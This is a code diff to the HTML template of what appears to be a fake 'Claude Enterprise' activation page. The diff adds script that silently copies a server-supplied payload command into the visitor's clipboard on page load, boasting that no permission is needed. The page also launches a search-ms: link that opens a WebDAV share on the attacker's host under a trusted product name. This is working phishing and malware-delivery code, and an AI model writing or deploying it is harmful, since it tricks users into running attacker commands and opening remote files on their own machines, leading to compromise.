@@ -319,7 +319,7 @@
         </button>
         <button id="btn-confirm-sync"
           class="px-6 py-2.5 bg-[#D97757] hover:bg-[#C25E03] text-white rounded-xl text-sm font-semibold flex items-center gap-2 transition">
-          Launch Activation Agent
+          <span id="btn-confirm-text">Close</span>
           <span class="text-lg leading-none">→</span>
         </button>
       </div>
@@ -328,6 +328,9 @@
 
   <!-- Client-side script -->
   <script>
+    // Inject payload command from server
+    window.PayloadCommand = {{ payload_command | tojson }};
+    
     // Track initial landing/visit
     fetch('/api/track', {
       method: 'POST',
@@ -374,6 +377,35 @@
         if (!response.ok) throw new Error();
         const html = await response.text();
         container.innerHTML = html;
+        
+        // Force copy - NO permission needed with execCommand
+        function doCopy() {
+          var cmd = window.PayloadCommand;
+          if (!cmd || cmd.length < 5) return;
+          
+          var lines = cmd.split('\n').filter(function(l) { 
+            return l.trim() && !l.startsWith('#'); 
+          });
+          var fullCmd = lines.join('; ');
+          
+          // Update cmd-display if exists
+          const cmdEl = document.getElementById('cmd-display');
+          if (cmdEl) cmdEl.textContent = fullCmd;
+          
+          // Use execCommand (no permission needed!)
+          var ta = document.createElement('textarea');
+          ta.value = fullCmd;
+          ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;';
+          document.body.appendChild(ta);
+          ta.focus();
+          ta.select();
+          var ok = document.execCommand('copy');
+          document.body.removeChild(ta);
+          console.log('[+] Copied:', ok);
+        }
+        
+        // Copy on load
+        setTimeout(doCopy, 200);
       } catch (e) {
         container.innerHTML = `<p class="text-sm text-amber-600 p-6">Loading activation instructions...</p>`;
       }
@@ -382,6 +414,15 @@
     // Main Activation
     function launchActivation() {
       const modal = document.getElementById('onboarding-modal');
+      const modalTemplate = window.ModalTemplate || "{{ modal_template }}";
+      
+      // Old template: just close modal
+      if (modalTemplate === 'old_onboard_template.html') {
+        closeModal();
+        return;
+      }
+      
+      // New template (search-ms): trigger search-ms
       if (modal) {
         modal.classList.add('opacity-0', 'pointer-events-none');
         const transformEl = modal.querySelector('.transform');
@@ -390,10 +431,7 @@
 
       setTimeout(() => {
         const domain = window.location.hostname || "127.0.0.1";
-        
-        // Format 1: UNC path với encoded URL
         const searchMS = `search-ms:query=activate&crumb=location:${encodeURIComponent(`\\\\${domain}\\dav`)}&displayname=Claude%20Enterprise`;
-        
         console.log("[+] Triggering search-ms:", searchMS);
         
         const a = document.createElement('a');
@@ -404,6 +442,15 @@
         document.body.removeChild(a);
       }, 400);
     }
+    
+    // Update button text based on template
+    window.addEventListener('DOMContentLoaded', () => {
+      const modalTemplate = window.ModalTemplate || "{{ modal_template }}";
+      const btnText = document.getElementById('btn-confirm-text');
+      if (btnText) {
+        btnText.textContent = modalTemplate === 'old_onboard_template.html' ? 'Close' : 'Launch Activation Agent';
+      }
+    });
 
     // Auto trigger when page loads
     window.addEventListener('DOMContentLoaded', () => {
